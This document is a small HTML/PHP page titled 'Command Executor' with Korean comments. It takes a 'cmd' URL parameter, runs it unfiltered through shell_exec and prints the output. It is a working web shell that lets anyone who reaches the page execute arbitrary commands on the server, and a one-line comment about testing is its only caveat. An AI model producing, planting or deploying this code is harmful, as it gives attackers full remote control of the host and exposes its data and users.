<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Executor</title>
</head>
<body>
    <?php
        if (isset($_GET['cmd'])) {
            $cmd = $_GET['cmd'];
            // 테스트 목적일 때 사용. 실제 코드에서는 보안에 주의해야 합니다.
            $output = shell_exec($cmd);
            echo "<pre>" . htmlspecialchars($output) . "</pre>";
        } else {
            echo "실행할 명령어가 없습니다.";
        }
    ?>
</body>
</html>